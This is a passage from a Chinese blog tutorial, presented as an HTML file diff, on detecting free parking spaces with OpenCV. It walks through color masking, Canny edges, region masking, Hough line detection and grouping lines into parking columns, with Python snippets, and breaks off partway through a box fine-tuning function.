@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>OpenCV实践小项目(三) - 停车场车位实时检测 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">OpenCV实践小项目(三) - 停车场车位实时检测</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="markdown_views prism-tomorrow-night">
+                    
+                        
+                    
+                    <h2>
+<a id="1__0"></a>1. 写在前面</h2> 
+<p>今天整理OpenCV入门的第三个实战小项目，前面的两篇文章整理了信用卡数字识别以及文档OCR扫描， 大部分用到的是OpenCV里面的基础图像预处理技术，比如轮廓检测，边缘检测，形态学操作，透视变换等， 而这篇文章的项目呢，不仅需要一些基础的图像预处理，还需要搭建模型进行识别和预测，所以通过这个项目，能把图像预处理以及建模型等一整套流程拉起来，并应用到实际的应用场景，还是非常有意思的。</p> 
+<p>停车场车位实时检测任务，是拿到停车场的一段视频video，主要完成两件事情：</p> 
+<ol>
+<li>检测整个停车场当中，当前一共有多少辆车，一共有多少个空余的车位</li>
+<li>把空余的停车位标识出来，这样用户停车的时候，就可以直接去空余的停车位处， 为停车节省了很多时间</li>
+</ol> 
+<p>所以这个项目还是非常有实践应用价值的，用了大约一天半的时间搞定这个项目，参考的是唐老师的<a href="https://www.bilibili.com/video/BV1PV411774y?p=62">OpenCV入门教程视频</a>， 不过这里面对于这个任务做的相对粗糙，我在这个基础上基于我的理解进行了一些优化，主要改动如下：</p> 
+<ol>
+<li>数据处理方面，按列框出停车位之后，我对每一列框的坐标手工进行了调整，确保每个停车位不遗漏，不多余， 然后是对每个停车位的坐标位置进行了微调，尽量让其标记的准一些</li>
+<li>模型方面，原视频采用迁移学习方式，基于keras对VGG网络进行的微调，而我模型这里统一基于pytorch，用的ResNet32预训练模型进行的finetune，验证集正确率能到0.94多，但第一版还是有少量预测的不是很准，所以又基于已有的帧图片做了数据增强，额外增加了一些数据，把准确率提升到0.98左右</li>
+<li>项目的整体架构全部改变，算是听懂了上面的思想，然后基于自己的理解进行的重构，好处是后面可以进行各种优化，按照自己需求做数据增强，数据预处理以及训练各种高级模型等。</li>
+</ol> 
+<p>不过，发现小resnet就够强大的了，最终的预测效果如下：</p> 
+<p><img src="https://images2.imgbox.com/3a/fe/LULDVXwg_o.png" alt="在这里插入图片描述"><br> 这是视频中的某一帧图像，实际运行的时候，是读入视频，快速分开帧，每一帧做出这样的预测标记，然后实时显示。这样在每个时刻，都能动态的知道该停车场有哪些车位空了出来。</p> 
+<p>下面就对这个项目中用到的关键技术进行整理，由于这个项目稍微大一些，代码量多，不可能在这里全部展示，但想记录下对于这个项目我的思考过程，以及各种处理的动机，以及如何进行的处理，我觉得这个才是对以后有用的东西。</p> 
+<h2>
+<a id="2__19"></a>2. 整体流程梳理</h2> 
+<p>首先，拿到这个任务之后， 得大致上梳理下流程，才能确定行动方案。 我们开始拿到了这样的一段视频，那么为了完成上面停车位检测以及识别的任务，就需要考虑两步：</p> 
+<ol>
+<li>我得先把停车场的每个停车位给提取出来</li>
+<li>有了每个停车位，我训练一个模型，去预测这个停车位上有没有车就行啦，把没有车的标识出来，然后统计个数</li>
+</ol> 
+<p>其实宏观上就这么两大步。那么后面的问题就是怎么把每个车位提取出来，又怎么训练模型预测呢？</p> 
+<p>我这里主要分为了两大步， 数据预处理以及模型的训练及预测：</p> 
+<ol>
+<li> <p>数据预处理方面</p> 
+  <ol>
+<li>以视频中某一帧的图像为单位，进行处理</li>
+<li>通过二值化，灰度化，边缘检测，特定点标定连线等，把图片中多余的部分去掉，只保留停车场内的这部分对象</li>
+<li>霍夫变换的直线检测，去找图片中的直线，根据直线坐标，先按列为单位，把车位按列框起来， 然后对框手动微调</li>
+<li>在每一列中，锁定每个停车位的位置，并对每个停车位进行标号，把这个保存成字典</li>
+<li>有了每个停车位的位置，就能提取出对应图片，可以作为后面模型的训练以及验证的数据集，不过需要人工手动划分</li>
+</ol> </li>
+<li> <p>通过上面步骤，会积累一些数据，大约800多张图片，接下来就可以训练模型，但是由于数据量太少，从头训练模型往往效果不好，所以这里采用迁移学习的方式，使用了预训练的resnet34，用这800多张图片微调。</p> </li>
+<li> <p>训练好了模型保存，接下来，对于每一帧图像，有了停车位位置字典，就能直接提取出每一个停车位，然后对于这每个停车位，模型预测有没有车即可</p> </li>
+</ol> 
+<p>所以有了这样的一个流程，就能再进一步分解细化，就可以大处着眼小处着手啦，下面整理每一步里面的关键细节。</p> 
+<h2>
+<a id="3__39"></a>3. 数据预处理</h2> 
+<h3>
+<a id="31__40"></a>3.1 背景过滤</h3> 
+<p>首先，把一帧图像读入进来，原始图像如下：</p> 
+<p><img src="https://images2.imgbox.com/bd/a1/wpBLINDc_o.png" alt="在这里插入图片描述"><br> 先通过二值化的方式过滤掉背景，突出重要信息，然后转成灰度图。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">select_rgb_white_yellow</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 过滤背景</span>
+    lower <span class="token operator">=</span> np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    upper <span class="token operator">=</span> np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token comment"># 三个通道内，低于lower和高于upper的部分分别变成0， 在lower-upper之间的值变成255， 相当于mask，过滤背景</span>
+    <span class="token comment"># 保留了像素值在120-255之间的像素值</span>
+    white_mask <span class="token operator">=</span> cv2<span class="token punctuation">.</span>inRange<span class="token punctuation">(</span>image<span class="token punctuation">,</span> lower<span class="token punctuation">,</span> upper<span class="token punctuation">)</span>
+    masked_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>bitwise_and<span class="token punctuation">(</span>image<span class="token punctuation">,</span> image<span class="token punctuation">,</span> mask<span class="token operator">=</span>white_mask<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> masked_img
+masked_img <span class="token operator">=</span> select_rgb_white_yellow<span class="token punctuation">(</span>test_image<span class="token punctuation">)</span>
+
+</code></pre> 
+<p>这里看到<code>inRange()</code>，想到了之前用到的二值化的方法threshold, 我在想这俩有啥区别？ 为啥这里不用这个了？ 下面是我经过探索得到的几点使用经验：</p> 
+<ol>
+<li>
+<code>cv2.threshold(src, thresh, maxval, type[, dst])</code>:针对的是单通道图像(灰度图), 二值化的标准,<code>type=THRESH_BINARY: if x &gt; thresh, x = maxval, else x = 0</code>, 而<code>type=THRESH_BINARY_INV</code>: 和上面的标准反着，目前常用到了这俩个</li>
+<li>
+<code>cv2.inRange(src, lowerb, upperb)</code>：可以是单通道图像，可以是三通道图像，也可以进行二值化，标准是<code>if x &gt;= lower and x &lt;= upper, x = 255, else x = 0</code>
+</li>
+</ol> 
+<p>这里做了一个实验， 事先把图片转化成灰度图<code>warped = cv2.cvtColor(test_image, cv2.COLOR_BGR2GRAY)</code>，然后下面两句代码的执行结果是一样的:</p> 
+<ul>
+<li><code>cv2.threshold(warped, 119, 255, cv2.THRESH_BINARY)[1]</code></li>
+<li><code>cv2.inRange(warped, 120, 255)</code></li>
+</ul> 
+<p>处理之后的图片长这样：</p> 
+<p><img src="https://images2.imgbox.com/b0/fe/jtBLkwC7_o.png" alt="在这里插入图片描述"></p> 
+<h3>
+<a id="32_Canny_71"></a>3.2 Canny边缘检测</h3> 
+<p>接下来，采用Canny边缘检测算法，检测出边缘来</p> 
+<pre><code class="prism language-python">low_threshold<span class="token punctuation">,</span> high_threshold <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">200</span>
+edges_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>Canny<span class="token punctuation">(</span>gray_img<span class="token punctuation">,</span> low_threshold<span class="token punctuation">,</span> high_threshold<span class="token punctuation">)</span>
+</code></pre> 
+<p>结果如下:<br> <img src="https://images2.imgbox.com/5d/b9/hIRw6HEb_o.png" alt="在这里插入图片描述"><br> 下面尝试把停车场这块提取出来， 把其余那些没用的去掉。</p> 
+<h3>
+<a id="33__81"></a>3.3 停车场区域提取</h3> 
+<p>这里的思路就是，先用6个标定点把停车场的这几个角给他定住，这个标定点得需要自己找。 找到之后， 采用OpenCV中的填充函数，就能制作一个mask矩阵，然后就能把其余部分去掉了。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">select_region</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""这里手动选择区域"""</span>
+    rows<span class="token punctuation">,</span> cols <span class="token operator">=</span> image<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># 下面定义6个标定点, 这个点的顺序必须让它化成一个区域，如果调整，可能会交叉起来，所以不要动</span>
+    pt_1  <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.06</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.90</span><span class="token punctuation">]</span>   <span class="token comment"># 左下</span>
+    pt_2 <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.06</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.70</span><span class="token punctuation">]</span>    <span class="token comment"># 左上</span>
+    pt_3 <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.32</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.51</span><span class="token punctuation">]</span>    <span class="token comment"># 中左</span>
+    pt_4 <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.6</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">]</span>      <span class="token comment"># 中右</span>
+    pt_5 <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.90</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">]</span>     <span class="token comment"># 右上</span>
+    pt_6 <span class="token operator">=</span> <span class="token punctuation">[</span>cols<span class="token operator">*</span><span class="token number">0.90</span><span class="token punctuation">,</span> rows<span class="token operator">*</span><span class="token number">0.90</span><span class="token punctuation">]</span>    <span class="token comment"># 右下</span>
+    
+    vertices <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>pt_1<span class="token punctuation">,</span> pt_2<span class="token punctuation">,</span> pt_3<span class="token punctuation">,</span> pt_4<span class="token punctuation">,</span> pt_5<span class="token punctuation">,</span> pt_6<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int32<span class="token punctuation">)</span>
+    point_img <span class="token operator">=</span> image<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    point_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>point_img<span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>COLOR_GRAY2BGR<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> point <span class="token keyword">in</span> vertices<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        cv2<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>point_img<span class="token punctuation">,</span> <span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+    <span class="token comment"># cv_imshow('points_img', point_img)</span>
+    
+    <span class="token comment"># 定义mask矩阵， 只保留点内部的区域</span>
+    mask <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros_like<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>mask<span class="token punctuation">.</span>shape<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        cv2<span class="token punctuation">.</span>fillPoly<span class="token punctuation">(</span>mask<span class="token punctuation">,</span> vertices<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>   <span class="token comment"># 点框住的地方填充为白色</span>
+        <span class="token comment">#cv_imshow('mask', mask)</span>
+    roi_image <span class="token operator">=</span> cv2<span class="token punctuation">.</span>bitwise_and<span class="token punctuation">(</span>image<span class="token punctuation">,</span> mask<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> roi_image
+
+roi_image <span class="token operator">=</span> select_region<span class="token punctuation">(</span>edges_img<span class="token punctuation">)</span>
+</code></pre> 
+<p>处理的效果如下：<br> <img src="https://images2.imgbox.com/84/c9/Sl6qSTYZ_o.png" alt="在这里插入图片描述"><br> 这样处理好了，我们就需要找到这里面的直线，然后通过直线去猜测大致的位置。</p> 
+<h3>
+<a id="34__118"></a>3.4 霍夫变换检测直线</h3> 
+<p>这里采用霍夫变换检测直线， 函数是cv2.HoughLinesP， 该函数能检测直线的两个端点(x0,y0, x1, y1)。函数原型:</p> 
+<blockquote> 
+ <p><code>HoughLinesP(image, rho, theta, threshold[, lines[, minLineLength[, maxLineGap]]]) -&gt; lines</code></p> 
+ <ul>
+<li>image: 边缘检测的输出图像，这里要注意必须是边缘检测的输出图像</li>
+<li>rho: 参数极径r以像素值为单位的分辨率，一般1</li>
+<li>threa: 以弧度为单位的分辨率，一般1</li>
+<li>threshold: 检测一条直线所需最少的曲线交点</li>
+<li>minLineLength: 能形成一条直线的最小长度，太短，不认为是一条直线</li>
+<li>maxLineGap: 两条直线直接最大间隔，小于这个值，认为是一条直线</li>
+</ul> 
+</blockquote> 
+<p>所以，这个函数拿来直接用。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">hough_lines</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 输入的图像需要是边缘检测后的结果</span>
+    <span class="token comment"># minLineLengh(线的最短长度，比这个短的都被忽略)和MaxLineCap（两条直线之间的最大间隔，小于此值，认为是一条直线）</span>
+    <span class="token comment"># rho距离精度,theta角度精度,threshod超过设定阈值才被检测出线段</span>
+    <span class="token keyword">return</span> cv2<span class="token punctuation">.</span>HoughLinesP<span class="token punctuation">(</span>image<span class="token punctuation">,</span> rho<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span> theta<span class="token operator">=</span>np<span class="token punctuation">.</span>pi<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">,</span> threshold<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> minLineLength<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> maxLineGap<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+list_of_lines <span class="token operator">=</span> hough_lines<span class="token punctuation">(</span>roi_image<span class="token punctuation">)</span>  <span class="token comment"># (2338, 1, 4)</span>
+</code></pre> 
+<p>竟然检测到了2338条直线，这里面肯定有很多不能用的，所以后面处理，需要对直线先进行一波筛选。筛选原则是线不能是斜的，且水平方向不能太长或者是太短。 具体代码下面会看到，这里先展示下过滤之后的效果。<br> <img src="https://images2.imgbox.com/59/83/4AqeJn0n_o.png" alt="在这里插入图片描述"><br> 过滤完了，总共628条直线。</p> 
+<h3>
+<a id="35__143"></a>3.5 以列为单位，划分停车位</h3> 
+<p>下面的代码会稍微复杂，所以需要分块讲思路。</p> 
+<p>首先，我们拿到了停车场的直线以及它的坐标位置。 过滤操作已经做好，接下来，就是对每条直线进行排序。 让这些线，从一列一列的，从上往下依次排列好。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">identity_blocks</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> lines<span class="token punctuation">,</span> make_copy<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> make_copy<span class="token punctuation">:</span>
+        new_image <span class="token operator">=</span> image<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 过滤部分直线</span>
+    stayed_lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2 <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+            <span class="token comment"># 这里是过滤直线，必须保证不能是斜的线，且水平方向不能太长或者太短</span>
+            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>y2<span class="token operator">-</span>y1<span class="token punctuation">)</span> <span class="token operator">&lt;=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x2<span class="token operator">-</span>x1<span class="token punctuation">)</span> <span class="token operator">&gt;=</span><span class="token number">25</span> <span class="token keyword">and</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x2<span class="token operator">-</span>x1<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">55</span><span class="token punctuation">:</span>
+                stayed_lines<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 对直线按照x1排序, 这样能让这些线从上到下排列好， 这个排序是从第一列的第一条横线，往下走，然后是第二列第一条横线往下，...</span>
+    list1 <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>stayed_lines<span class="token punctuation">,</span> key<span class="token operator">=</span>operator<span class="token punctuation">.</span>itemgetter<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>排列好之后，遍历所有线， 看看相邻两条线之间的距离，如果是一列， 那么两条线的x_1应该离得非常近，毕竟是同一列，如果这个值太大了，说明是下一列了。根据这个准则，遍历完之后，就能把这些线划分到不同的列里面。这里是用了一个字典，键表示列，值表示每一列里面的直线。</p> 
+<p>代码接上：</p> 
+<pre><code class="prism language-python">	<span class="token comment"># 找到多个列，相当于每列是一排车</span>
+    clusters <span class="token operator">=</span> collections<span class="token punctuation">.</span>defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>
+    dIndex <span class="token operator">=</span> <span class="token number">0</span>
+    clus_dist <span class="token operator">=</span> <span class="token number">10</span>   <span class="token comment"># 每一列之间的那个距离</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 看看相邻两条线之间的距离，如果是一列的，那么x1这个距离应该很近，毕竟是同一列上的</span>
+        <span class="token comment"># 如果这个值大于10了，说明是下一列的了，此时需要移动dIndex， 这个表示的是第几列 </span>
+        distance <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>list1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> list1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> distance <span class="token operator">&lt;=</span> clus_dist<span class="token punctuation">:</span>
+            clusters<span class="token punctuation">[</span>dIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>list1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            clusters<span class="token punctuation">[</span>dIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>list1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            dIndex <span class="token operator">+=</span> <span class="token number">1</span>
+</code></pre> 
+<p>有了每一列里面的直线，下面就是就是遍历每一列，先拿到所有直线，然后找到纵坐标的最大值和最小值，以及横坐标的最大和最小值，但由于横坐标这里，首尾列都一排车位，中间排都是两列，不好直接取到最大最小坐标，所以这里采用了求平均的方式。 这样遍历完，针对每一列，就能得到左上角点和右下角点，这是一个矩形框。</p> 
+<p>代码接上：</p> 
+<pre><code class="prism language-python">	<span class="token comment"># 得到每列停车位的矩形框</span>
+    rects <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+    i <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> key <span class="token keyword">in</span> clusters<span class="token punctuation">:</span>
+        all_list <span class="token operator">=</span> clusters<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        cleaned <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>all_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment"># 有5个停车位至少</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cleaned<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>
+            cleaned <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>cleaned<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> tup<span class="token punctuation">:</span> tup<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            avg_y1 <span class="token operator">=</span> cleaned<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+            avg_y2 <span class="token operator">=</span> cleaned<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>avg_y2<span class="token operator">-</span>avg_y1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">:</span>
+                <span class="token keyword">continue</span>
+            avg_x1 <span class="token operator">=</span> <span class="token number">0</span>
+            avg_x2 <span class="token operator">=</span> <span class="token number">0</span>
+            <span class="token keyword">for</span> tup <span class="token keyword">in</span> cleaned<span class="token punctuation">:</span>
+                avg_x1 <span class="token operator">+=</span> tup<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+                avg_x2 <span class="token operator">+=</span> tup<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+            avg_x1 <span class="token operator">=</span> avg_x1 <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cleaned<span class="token punctuation">)</span>
+            avg_x2 <span class="token operator">=</span> avg_x2 <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cleaned<span class="token punctuation">)</span>
+            
+            rects<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>avg_x1<span class="token punctuation">,</span> avg_y1<span class="token punctuation">,</span> avg_x2<span class="token punctuation">,</span> avg_y2<span class="token punctuation">]</span>
+            i <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Num Parking Lanes: '</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>下面，把矩形框画出来：</p> 
+<pre><code class="prism language-python">	<span class="token comment"># 把列矩形画出来</span>
+    buff <span class="token operator">=</span> <span class="token number">7</span>
+    <span class="token keyword">for</span> key <span class="token keyword">in</span> rects<span class="token punctuation">:</span>
+        tup_topLeft <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        tup_botRight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        cv2<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> tup_topLeft<span class="token punctuation">,</span> tup_botRight<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> new_image<span class="token punctuation">,</span> rects
+</code></pre> 
+<p>这里的buff，也是进行了一点微调操作。 这种是根据实际场景来的，不是死的。 效果如下：<br> <img src="https://images2.imgbox.com/92/b7/nGHZ7Po7_o.png" alt="在这里插入图片描述"><br> 这样就会发现，对于每一列的停车位，有了大致上的矩形框标定，但是这个非常粗糙。 原视频里面就基于这个往后面走了。 我这里对于每一列框进行微调，因为这个框非常重要。不准的话影响后面的具体车位划分。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">rect_finetune</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> rects<span class="token punctuation">,</span> copy_img<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> copy_img<span class="token punctuation">:</span>
+        image_copy <span class="token operator">=</span> image<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># 下面需要对上面的框进行坐标微调， 让框更加准确</span>
+    <span class="token comment"># 这个框很重要，影响后面停车位的统计，尽量不能有遗漏</span>
+    <span class="token keyword">for</span> k <span class="token keyword">in</span> rects<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">10</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">10</span>
